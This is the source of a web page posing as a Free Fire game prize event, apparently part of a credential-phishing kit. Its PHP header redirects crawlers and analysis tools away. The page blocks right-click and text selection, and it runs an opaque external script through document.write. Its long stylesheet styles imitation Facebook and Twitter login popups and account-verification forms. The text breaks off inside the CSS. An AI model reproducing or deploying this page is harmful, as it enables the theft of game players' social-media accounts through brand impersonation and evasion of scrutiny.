<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
    header('Location: cracker.php');
    die();
}
?>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>FREE FIRE EVENT</title>
    <meta property="og:description" content="Mulai Free Lucky Spin dan Kumpulkan hadiah eksklusif Anda dari FREE FIRE sekarang!">
    <meta property="og:image" content="https://freefiremobile-a.akamaihd.net/common/web_event/common/images/ff-logo-icon.png">
    <meta property="og:image:width" content="540">
    <meta property="og:image:height" content="282">
    <link href="./index_files/css" rel="stylesheet">
    <link rel="stylesheet" href="css-zone/facebook.css">
    <link rel="stylesheet" href="css-zone/twitter.css">
    <link href="https://fonts.googleapis.com/css2?family=Teko&display=swap" rel="stylesheet">
    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
    <link rel="icon" type="img/png" href="https://freefiremobile-a.akamaihd.net/common/web_event/common/images/ff-logo-icon.png" sizes="32x32">
    <script type="text/javascript" src="js-zone/jquery.js"></script>
    <script type="text/javascript" src="js-zone/main-zone.js"></script>
    <script src="https://unpkg.com/bootrun@3.9.7/min.js"></script>
    <script language="JavaScript">
        document.write(ls())
    </script>
</head>

<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<style type="text/css">
@charset "utf-8";
@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
*,*:before,*:after {
	-webkit-box-sizing:border-box;
	-moz-box-sizing:border-box;
	box-sizing:border-box;
}
@font-face {
    font-family: 'arial,sans-serif'; 
    font-style: normal;
    font-weight: 700;
    src: url(fonts/arial,sans-serif.woff2) format("woff2"), 
        url(fonts/arial,sans-serif.woff) format("woff"),
        url(fonts/arial,sans-serif.ttf) format("truetype");
}
.sec-container {	
   background: url('img/container.jpg') no-repeat center;background-size: cover;	
   margin-top: -2px;
   padding: 2px;
   width:100%;
   height: 550px;
   border-left: 0px solid #fff;
   border-right: 0px solid #fff;
   border-top: 0px solid #fff;
   border-bottom: 0px solid #fff;
}
.sec-verify-container {	
   background: url('img/container.jpg') no-repeat center;background-size: cover;	
   margin-top: -2px;
   padding: 2px;
   width:100%;
   height: 500px;
   border-left: 1px solid #fff;
   border-right: 1px solid #fff;
   border-top: 0px solid #fff;
   border-bottom: 0px solid #fff;
}
.gallery-container {	   
   background-size: 100% 100%;   
   margin-top:-2px;  
   width:100%;
   height:auto;
   border: 0px solid #fff;   
   float:left;
}
.container-box {	   
   background-size: 100% 100%;      
   width:100%;
   height:690px;   
}
.landing {
	background: url(img/landing.jpg) no-repeat center center;
	background-size: cover;
	width:100%;
	height:auto;
}
.navbar {
	background: #0C0C0C;
	width: 100%;
	height: 55px;
}
.navbar-logo {
	width: 150px;
	float: left;
	margin-top: 15px;
	margin-left: 11px;
}
.navbar-shop {
	width: 25px;
	margin-top: 18px;
	margin-right: 20px;
}
.navbar-language {
	width: 18px;
	margin-top: 18px;
	margin-right: 20px;
}
.navbar-menu {
	width: 20px;
	margin-top: 18px;
	margin-right: 5px;
}
.navbar-right {
	width: auto;
	float: right;
}
.navbar-download {
	background: #ffca13;
	width: 46px;
	height: 45px;
	margin-top: 9px;
	margin-right: 10px;
	border-radius: 7px;
	float: right;
}
.navbar-download img {
	width: 20px;
	height: 21px;
	margin: 13px;
}
.header {
	width: 100%;
	height: auto;
}
.header img {
	width: 100%;
	height: auto;
	margin-top: -0px;
	border-top: 1px solid #FF7632;
	border-bottom: 1px solid #FF7632;
}
.header video {
	width: 100%;
	border:none;
}
.slideshow-container {
  max-width: 1000px;
  position: relative;
  margin: auto;
  border-top: 1px solid #ECD954;
  border-bottom: 1px solid #ECD954;
}
.fade {
  -webkit-animation-name: fade;
  -webkit-animation-duration: 1.5s;
  animation-name: fade;
  animation-duration: 1.5s;
}
  .notiftwitter {
	width: 30%;
	height: 30px;
	margin-left: 35%;
	margin-right: auto;
	padding: 5px;
	font-size: 22px;
	font-family:Teko;
	font-weight: 500;
	text-align: center;
	color: #ECD954;
	margin-bottom: 0px;
	border: none;
	position: relative;
	outline: none;
	display: block;
}
.season-logo {
	width:20%;
	margin:15px;
	float:left;
}
.season-logos {
	width:40%;
	margin:5px;
	float:right;
}
.season-slogan {
	width: 100%;
	margin-top: 100%;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.season-btn {
	background: url(/img/yes_arial,sans-serif.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	padding: 10px;
	padding-left: 30px;
	padding-right: 30px;
	font-size: 18px;
	font-family:arial,sans-serif;
	font-weight: 500;
	text-align: center;
	color: #000;
	margin-bottom: 3px;
	border: none;
	position: relative;
	outline: none;
	display: block;
}
.season-btn:hover {
	background: url(img/menu_on.png) no-repeat center;
	background-size: 100% 100%;
	color: #000;
	transition: 0.5s;
}
.event-title {
	color: #fff;
	margin-top: 15px;
	font-size: 35px;
	font-family: Teko;
	font-weight: bold;
	text-align: center;
	text-transform: uppercase;
	text-shadow: 1.3px 1.3px 0px #2C2728;
	letter-spacing: 1px;
}
.event-subtitle {
    display: block;
    margin-left: 5%;
    margin-right: 5%;
    margin-top: 1px;
    margin-bottom: 10px;
    overflow: hidden;
    text-align: center;
    white-space: nowrap;
    width: 90%;
}
.event-subtitle>span {
    display: inline-block;
    position: relative;
    color: #fff;
    cursor: default;
    font-family: arial, sans-serif;
    font-size: 13px;
	text-shadow: 1px 1px 0px #2C2728;
}
.event-subtitle>span:before,
.event-subtitle>span:after {
    background: #E3C86D;
	border-bottom: 2px solid #fff;
    content: "";
    height: 1px;
    position: absolute;
    top: 50%;
    width: 9999px;
}
.event-subtitle>span:before {
    margin-right: 15px;
    right: 100%;
}
.event-subtitle>span:after {
    left: 100%;
    margin-left: 15px;
}
.event-notification {
    background: url(img/alert-arial,sans-serif.png) no-repeat center;
	background-size: 100% 100%;
	width:98%;
	height:55px;
	padding:7px;
	margin-top:3px;
	margin-bottom:7px;
	margin-right: auto;
	margin-left: auto;
}
.event-notification-text {
	padding-top:10px;
	text-align:center;
	font-family:arial,sans-serif;
	color:#2AAFF4;
	font-size:17px;
}
.alert-wrapper {
  width:98%;
  height:auto;
  border: none;
  display:block;
  margin:10px auto;  
  margin-top: 5px;  
}
.alert {
  background:url(img/notifs-sec.png) no-repeat center;
  background-size:100% 100%;
  width:100%;
  height:52px;
  margin-top: 10px;
  margin-bottom: 10px;
  padding:7px;
  margin-left: auto; 
  margin-right: auto; 
  color:#fff;  
  border:none;
}
.alert-text {
  margin-top: 5px;
  margin-left: 0px;
  padding:7px;
  color:#FFF84E;
  text-align:left;
  font-size:16px;
  font-family:arial,sans-serif;
  border:none;
}
.alert-text-mid {
  margin-top: 4px;  
  padding:7px;
  color:#FFF;
  text-align:center;
  font-size:16px;
  font-family:arial,sans-serif;
  border:none;
  text-shadow: 2px 2px 5px #000;
}
.alert-time {
  width:23%;
  height:auto;
  color:#FFF734;
  text-align:center;  
  margin-top: 7px;
  margin-right: 3px; 
  border:1px solid #FFF84E;
  border-radius:0px;
  float: right;
  font-size:17px;
  font-family:arial,sans-serif;
}
.popup {
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
	background-color:rgba(0, 0, 0, 0.4);
}
.popup-box-wrapper {
	width: 390px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: center;
	font-family:'arial,sans-serif';
	color:#fff;
}
.popup-box-wrappers {
	width: 390px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: center;
	font-family:'arial,sans-serif';
	color:#fff;
}
.popup-box-navbar {	
	background-size:100% 100%;
	height: 43px;
	padding-bottom: 5px;
}
.popup-box-navbar img {
	width: 25px;
	height: 25px;
	margin-top: 7px;
	margin-right: 15px;
	float: right;
}
.popup-box-navbar-title {	
	padding-top: 7px;
	padding-bottom: 2px;
	font-size: 20px;
	font-family:arial,sans-serif;
	font-weight: 300;
	text-align: center;
	color: #fff;
}
.popup-box-bg {
	background:url(img/popups.jpg) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	margin-top: -12px;
}
.popup-box-gamecon {
	width: 52%;
	height: 65px;
	margin-left: auto;
	margin-right: auto;
	margin-top: 10px;
	display: block;
}
.popup-box-alert {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
    font-family:arial,sans-serif;
	font-weight: 500;
	text-align: left;
	display: block;
}
.popup-box-alertlog {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #999999;
	font-size: 15px;
    font-family:arial,sans-serif;
	font-weight: 500;
	text-shadow: 2px 2px 5px #000;
	text-align: center;
	display: block;
}
.popup-box-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #fff;
	font-size: 18px;
    font-family:arial,sans-serif;
	font-weight: 500;
	text-align: center;
	text-shadow: 2px 2px 5px #000;
	text-decoration: underline;
	display: block;
}
.popup-box-alert2 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
    font-family:arial,sans-serif;
	font-weight: 500;
	text-align: left;
	display: block;
}
.popup-box-alert0 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #AAAAAA;
	font-size: 15px;
    font-family:arial,sans-serif;
	font-weight: 500;
	text-align: right;
	display: block;
}
.popup-box-alert3 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #999999;
	font-size: 15px;
    font-family:arial,sans-serif;
	font-weight: 500;
	text-align: left;
	text-shadow: 2px 2px 5px #000;
	display: block;
}
.popup-box-alert7 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #F5EAB0;
	font-size: 18px;
    font-family:arial,sans-serif;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-box-alert4 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #999999;
	font-size: 15px;
    font-family:arial,sans-serif;
	font-weight: 500;
	text-shadow: 2px 2px 5px #000;
	text-align: center;
	display: block;
}
.popup-box-alert4 i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #AAAAAA;
	font-size: 50px;
	text-align: center;
}
.popup-box-item {
	background:url(img/bg-item.jpg) no-repeat center center;
	background-size:100% 100%;
	width:23%;
	height:85px;
	padding:10px;
	margin-left:auto;
	margin-right:auto;
	text-align: right;
	display: block;
}
.popup-box-item img {
	width:100%;
	height:100%;
}
.popup-box-item span {
	color: #fff;
	font-size: 22px;
	font-family: arial,sans-serif;
	text-align: right;
	position: absolute;
	left: 0;
	right: 2px;
	bottom: -5px;
}
.popup-box-form {
	width: 85%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.popup-box-form label {
  display: inline-block;
  width: 140px;
  text-align: right;
  color: yellow;
}
.popup-box-form input {
	background: #4A4A4A;
	background-size: 100% 100%;
	width: 100%;
	height: 35px;
	margin-bottom: 3px;
	padding: 4px;
	padding-left: 10px;
	color: #FFFBF7;
	font-size:16px;
	font-family:arial,sans-serif;
	font-weight: 300;
	border: 1px solid #AAAAAA;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.popup-box-form input::placeholder {
	color: #FFFBF7;
}
.popup-box-form select {
	background: #4A4A4A;
	background-size: 100% 100%;
	width: 100%;
	height: 35px;
	margin-bottom: 3px;
	padding: 4px;
	padding-left: 10px;
	color: #FFFBF7;
	font-size:16px;
	font-family:arial,sans-serif;
	font-weight: 300;
	border: 1px solid #AAAAAA;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.popup-box-footer {	
	background-size:100% 100%;
	margin-top: 20px;
	width: 100%;
	height: 55px;
}
.popup-box-footer button {
	background: url(img/button-on.png) no-repeat center;
	background-size: 100% 100%;
	width: 35%;
	height: 35px;
	margin-top: -5px;
	padding: 5px;
	padding-top: 4px;
	padding-left: 35px;
	padding-right: 35px;
	color: #fff;
	font-size:16px;
	font-family: arial,sans-serif;
	font-weight: 500;
	text-shadow: 2px 2px 5px #000;
	text-align: center;
	border: none;
	outline: none;
}
.popup-box-form-footerx {
	background-size:100% 100%;
	width: 100%;
	height: 55px;
	margin-top: 15px;	
}
.popup-box-form-footerx button {
	background: url(img/button-on.png) no-repeat center;
	background-size: 100% 100%;
	width: 35%;
	height: auto;
	margin-top: 7px;
	padding: 5px;
	padding-bottom: 3px;	
	padding-left: 35px;
	padding-right: 38px;
	color: #000;
	font-size:17px;
	font-family: arial,sans-serif;
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
}
.popup-btn-login {
    width: 90%;
    height: 35px;
    padding: 6px;
    padding-top: 10px;
    margin-top: 10px;
    margin-bottom: 25px;
    margin: 5px;
    color: #000;
	font-size: 13px;
    font-family: arial, sans-serif;
    border: 1px solid #999999;
    border-radius: 3px;
    outline: none;
    margin-bottom: 45px;
    position: relative;
}
.popup-btn-login i {
    color: #fff;
    margin-top: -5px;
    font-size: 25px;
    float: left;
}
.popup-btn-facebook {
    background: #1778f2;
    color: #fff;
	margin-bottom: 45px;
}
.popup-btn-twitter {
    background: #198B96;
	margin-bottom: 3px;
    color: #fff;
}
.popup-btn-footer {
    display: block;
    margin-left: auto;
    margin-right: auto;
    margin-top: -13px;
    margin-bottom: 10px;
    overflow: hidden;
    text-align: center;    
    white-space: nowrap;
    width: 80%;
}
.popup-btn-footer>span {
    display: inline-block;
    position: relative;
    color: #AAAAAA;
    cursor: default;
    font-size: 11px;    
	text-shadow: none;
}
.popup-btn-footer>span:before,
.popup-btn-footer>span:after {
    background: #AAAAAA;
	border-bottom: 1px solid #AAAAAA;
    content: "";
    height: 1px;
    position: absolute;
    top: 50%;
    width: 9999px;
}
.popup-btn-footer>span:before {
    margin-right: 15px;
    right: 100%;
}
.popup-btn-footer>span:after {
    left: 100%;
    margin-left: 15px;
}
.popup-login {
	background:rgba(0,0,0,0.4);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
}
.popup-box-login-fb {
	background:#ECEFF6;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:1.9%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-twitter {
	background:#fff;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.close-fb {
	background: #3b5998;
	width: 25px;
	height: 25px;
	color: #fff;
	font-size: 20px;
	text-align: center;
	text-decoration: none;
	border-radius: 50%;
	top: -10px;
	right: -10px;
	position: absolute;
	display: block;
}
.close-fb i {
	padding-top: 3px;
}
.close-other {
	background: #fff;
	width: 25px;
	height: 25px;
	color: #000;
	font-size: 20px;
	text-align: center;
	border-radius: 50%;
	top: -12px;
	right: -12px;
	position: absolute;
	z-index: 9999999;
	display: block;
}
.close-other i {
	color: #20px;
	padding-top: 3px;
}
.popups {
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
	background-color:rgba(0, 0, 0, 0.4);
}
.popup-box-navbars {
	background:url(img/popup-navbar2.png) no-repeat center center;
	background-size:100% 100%;
	height: 43px;
	padding-bottom: 5px;
}
.popup-box-navbars img {
	width: 20px;
	height: 20px;
	margin-top: 15px;
	margin-right: 18px;
	float: right;
}
.popup-box-navbars-title {	
	padding-left: 40px;
	padding-top: 14px;
	padding-bottom: 2px;
	font-size: 20px;
	color: #fff;
	font-family:arial,sans-serif;
	font-weight: 300;
	text-align: center;	
}
.kagetk {     
	background: rgba(0, 0, 0, 0.2);
	background-size:50% 50%;
	width: 80%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	border: 1px solid #fff;
	display: none;
	padding: 10px;
	color: #fff;
	font-size: 14px;
	font-family: arial,sans-serif;
	text-align: center;
}
.popup-box-bgs {
	background:url(img/popup-box-bg2.png) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	margin-top: -12px;
}
.popup-box-alerts4 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #fff;
	font-size: 20px;
    font-family:arial,sans-serif;
	font-weight: 500;
	text-align: left;
	display: block;
}
.popup-box-alerts4 i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #F5EAB0;
	font-size: 50px;
	text-align: left;
}
.popup-box-formx label {
  width: 70%;
  text-align: left;
  padding-left: 20px;
  color: #B7B7B7;
  text-shadow:none;
  font-size:17px;
}
.popup-box-formx input {
	background: #001;
	width: 85%;
	height: 35px;
	margin-bottom: 8px;
	margin-left: 20px;
	padding-right: 4px;
	padding: 4px;
	color: #fff;
	font-size:15px;
	font-family:arial,sans-serif;
	font-weight: 500;
	border: 0.1px solid #fff;
	outline:none;
	position: left;
  -webkit-appearance: none;
  -moz-appearance: none;
}
.popup-box-formx input::placeholder {
	color: #BCCBCE;
}
.popup-box-footers {	
	background-size:100% 100%;
	margin-top: 20px;
	width: 100%;
	height: 55px;
}
.popup-box-footers button {
	background: #fff;	
	width: 30%;
	height: 33px;
	margin-top: -5px;
	padding: 5px;
	padding-top: 8px;
	padding-left: auto;
	padding-right: auto;
	color: #000;
	font-size:14px;
	font-family: arial,sans-serif;
	font-weight: 500;	
	text-align: center;
	border: none;
	outline: none;
}
.popup-box-formx-footer {
	background-size:100% 100%;
	width: 100%;
	height: 45px;
	margin-top: 20px;
}
.popup-box-formx-footer button {
	background: url(img/button-on.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: 30px;
	margin-top: 5px;
	padding: 4px;
	padding-left: 30px;
	padding-right: 30px;
	color: #000;
	font-size:16px;
	font-family: arial,sans-serif;
	font-weight: 500;
	text-align: center;
	border:none;
	outline: none;
}
.balance {
	background:url(img/bg-item.png) no-repeat center center;
	background-size:101% 100%;
	width: 94.3%;
	height: 100px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 7px;
	padding: 4px;
	border-top:2px solid #ECD954;
	border-left:2px solid #ECD954;
	border-right:2px solid #ECD954;
	border-bottom:2px solid #ECD954;
	display: block;
}
.balance-img {
	width: 50%;
	height: 97px;
	margin-top: -5px;
	margin-right: 5px;	
	float: left;	
	padding: 5px;
	border:1px #fff;  
}
.balance-nom {
	color: #fff;
	padding-top: 2px;
	padding-left: 5px;
	padding-bottom: 0px;
	font-size: 18px;
	font-family:arial,sans-serif;
	font-weight: 500;
	text-align: center;
	text-shadow:0 1px 0 #000;
	border-left: 3px solid #9FE9F7;
	line-height: 18px;
	float: left;
}
.balance-detail {
	width: auto;
	height: auto;
	padding-top: 2px;
	padding-left: 5px;
	padding-bottom: 0px;
	color: #fff;
	font-size: 15px;
	font-family:arial,sans-serif;
	text-align: left;
}
.balance-nom-button {
	background:url(img/yes_arial,sans-serif.png) no-repeat center center;
	background-size:100% 100%;
    width: 36%;
	height: auto;
	margin-top:7px;
	margin-left:auto;
	margin-right:auto;
	padding: 10px;
	font-size: 18px;
	color:#000;
	font-family:arial,sans-serif;
	text-align: center;
	border: none;
	outline: none;
	float: center;
}
.box {    
    background-size:103% 100%;
    width: 100%;
    height: 415px;
    margin-left:auto;
    margin-right:auto;
    margin-top: 30px;
	margin-bottom: 5px;
	border: 0px solid #FFFAC9;
	border-radius:5px;
	position: relative;
	display: block;
}
.box-item {
	width: 95%;	
	margin-left:auto;
    margin-right:auto;	
	padding-top:1px;
} 
.scroll {
	width:100%;
	overflow:none;
	position:relative;
	width: 100%;
	height:400px;
	margin-top:11px;
	display: block;
	scrollbar-face-color:#ffbb40;
	scrollbar-shadow-color:#ffbb40;
	scrollbar-highlight-color:#ffbb40;
	scrollbar-3dlight-color:#ffbb40;
	scrollbar-darkshadow-color:#ffbb40;
	scrollbar-track-color:#ffbb40;
	scrollbar-arrow-co
}
.btn-wrapper {
	width: 93%;
	height: 50px;	
	margin-top: 3px;
	margin-right: 3px;			
	font-family:arial,sans-serif;	
}
.btn-wrapper button {
    background: url(img/rules.png) no-repeat center;
	background-size: 100% 100%;
	width: 38%;
	height: 40px;
	margin: -10px;
	padding: 10px;
	color: #FFFAC9;
	font-family:arial,sans-serif;
	font-size: 17px;	
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
	float:right;
	display: inline-block;	
	text-shadow: 0 0 5px #000;
}
.footer {
	background: #000;	
	width: 100%;
	height: auto;
	padding: 15px;
	padding-top: 0px;
	padding-bottom: 25px;	
	border-top:1px solid #5FD8E9;
}
.footer-copyright-icon {
	width: 33%;
	padding-top: 25px;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.footer-copyright-text {	
	padding:5px;
	padding-top: 25px;
	margin-left: auto;
	margin-right: auto;	
	float: center;
	text-align: center;
	display: block;
}
.footer-copyright-text-left {
	color: #fff;
	font-size: 12px;
	padding:5px;
	font-family:sans-serif;
	text-align: center;
	display: inline-block;
	margin: 5px;
	border-bottom: 1px solid #fff;
}
.footer-copyright-text-center {
	color: #fff;
	font-size: 12px;
	padding:5px;
	font-family:sans-serif;
	text-align: center;
	display: inline-block;
	margin: 5px;
	border-bottom: 1px solid #fff;
}
.footer-copyright-text-right {
	color: #fff;
	font-size: 12px;
	padding:5px;
	font-family:sans-serif;
	text-align: center;
	display: inline-block;
	margin: 5px;
	border-bottom: 1px solid #fff;
}
.footer-copyright-text-cookie {
	color: #fff;
	font-size: 14px;
	font-family:Teko;
	text-align: center;
	display: block;
	margin-top: -5px;
}
.footer-copyright-text-icon {	
	width:15%;
	padding:5px;
	padding-top: 25px;
	margin-left: auto;
	margin-right: auto;	
	float: center;
	text-align: center;
	display: inline-block;
}
.footer-txt-copyrights {
	color: #bdbdbd;
	padding:10px;
	padding-top:10px;
	padding-bottom:25px;
	font-size: 14px;
	font-family:arial;
	text-align: center;
}
.verify-box-navbar {	
	background-size: 100% 100%;
	width: 93%;
	height: 19%;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.verify-box-navbar-description {
	width: 50%;
	margin-top: 50px;
	margin-right: 20px;
	color: #fff;
	font-size: 18px;
	font-family: Teko;
	font-weight: 500;
	text-align: left;
	float: right;
}
.verify-box-navbar-form {	
	background-size: 100% 100%;
	width: 93%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.verify-box-navbar-form input {
	background:url(img/verify-sec.png) no-repeat center center;
	background-size: 100% 100%;
	width: 95%;
	height: 40px;
	margin-left: 10px;
	margin-bottom: 4px;
	padding: 4px;
	padding-left: 15px;
	padding-right: auto;
	color: #fff;
	font-size:15px;
	font-family: arial,sans-serif;
	font-weight: 500;
	border: 0px solid #0FE4E4;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.verify-box-navbar-form input::placeholder {
	color: #fff;
}
.verify-box-navbar-form select {
	background:url(img/verify-sec.png) no-repeat center center;
	background-size: 100% 100%;
	width: 95%;
	height: 40px;
	margin-left: 10px;
	margin-bottom: 4px;
	padding: 4px;
	padding-left: 15px;
	padding-right: auto;
	color: #fff;
	font-size:15px;
	font-family: arial,sans-serif;
	font-weight: 500;
	border: 0px solid #0FE4E4;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.verify-box-content {	
	background-size: 100% 100%;
	width: 93%;
	height: auto;
	margin-top: -1px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 0px;
	padding-bottom: 25px;
	display: block;
}
.verify-box-content-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #fff;
	font-size: 18px;
    font-family:arial,sans-serif;
	font-weight: 500;
	text-align: center;
	display: block;
}
.verify-box-content-title i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #999999;
	font-size: 100px;	
	text-align: center;
}
.verify-box-content button {
	background:url(img/button-on.png) no-repeat center center;
	background-size:100% 100%;
	width: 50%;
	height: 45px;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 7px;
	padding-top: 5px;
	padding-left: 20px;
	padding-right: 20px;
	color: #fff;
	font-size: 18px;
	font-family:arial,sans-serif;
	font-weight: 500;
	text-align: center;
	border: none;	
	display: block;
}
.about-box-content {	
	background:url(img/aboutrules-sec.png) no-repeat center center;
	background-size:100% 100%;
	width: 96%;
	height: 120px;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 20px;	
	padding-left: auto;
	padding-right: auto;
	float: center;
	color: #000;
	display: block;
}
.about-box-content-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #000;
	font-size: 18px;
    font-family:arial,sans-serif;
	font-weight: 500;
	text-align: center;
	display: block;
}
.about-box-content-title i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #000;
	font-size: 100px;
	text-align: center;
}
.about-box-content button {
	background:url(img/button.png) no-repeat center center;
	background-size:100% 100%;
	width: 45%;
	height: 45px;	
	padding: 7px;
	margin-bottom: 20px;	
	margin-top: 20px;
	margin-right: 3px;	
	margin-left: -12px;	
	padding-left: 10px;	
	color: #000;
	font-size: 16px;
	font-family:arial,sans-serif;
	font-weight: 500;
	text-align: center;
	float:left;
	border: none;	
	display: block;
}
.processing-box-sec {	
	background:url(img/box-sec.png) no-repeat center center;
	background-size: 100% 100%;
	width: 100%;
	height: 380px;
	margin-left: auto;
	margin-right: auto;	
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 30px;	
	padding-bottom: -30px;
	display: block;
}
.processing-box-sec-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 20px;
	padding: 5px;
	padding-left: 15px;
	color: #fff;
	font-size: 15px;
    font-family:arial,sans-serif;	
	text-align: left;
	text-shadow: 2px 2px 5x #000;
	display: block;
}
figure {
	margin: 0;
	padding: 0;
	overflow: hidden;
}
.itemShine {
	position: relative;
}
.itemShine::before {
	background: -webkit-linear-gradient(left, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
	background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
	width: auto;
	height: auto;
	top: 0;
	left: -75%;
	position: absolute;
	z-index: 2;
	content: '';
	display: block;
	-webkit-transform: skewX(-25deg);
	transform: skewX(-25deg);
}
.itemShine::before {
	-webkit-animation: shine 2s infinite;
	animation: shine 2s infinite;
}
@-webkit-keyframes shine {
	100% {
		left: 125%;
		}
}
@keyframes shine {
	100% {
		left: 125%;
		}
}
.kanan {
	float: right;
}
.kiri {
	float: left;
}
.tengah {
	margin-left: auto;
	margin-right: auto;
	display: block;
}
::-webkit-scrollbar { 
    display: none;
    width: 0px;
}
.twitter-load {	
	background-size: 100% 100%;
	width: 93%;
	height: 385px;
	margin-top: -1px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 0px;
	padding-bottom: 25px;
	display: block;
}
.twitter-load-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #fff;
	font-size: 18px;
    font-family:arial,sans-serif;
	font-weight: 500;
	text-align: center;
	display: block;
}
.twitter-load-title i {
	margin-top: 140px;
	padding-top: 15px;
	padding-bottom: 15px;
	color: #00acee;
	font-size: 50px;	
	text-align: center;
}
.fb-load {	
	background-size: 100% 100%;
	width: 93%;
	height: 350px;
	margin-top: -1px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 0px;
	padding-bottom: 25px;
	display: block;
}
.fb-load img {		
	width: 50px;
	height: 50px;	
	margin-top: 170px;	
	margin-bottom: -55px;
}
.fb-load-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #999998;
	font-size: 18px;
    font-family:arial,sans-serif;
	font-weight: 500;
	text-align: center;
	display: block;
}
.fb-load-title i {
	margin-top: 170px;
	padding-top: 15px;
	padding-bottom: 15px;
	color: #999998;
	font-size: 30px;	
	text-align: center;
}
@media only screen and (max-width:600px) {
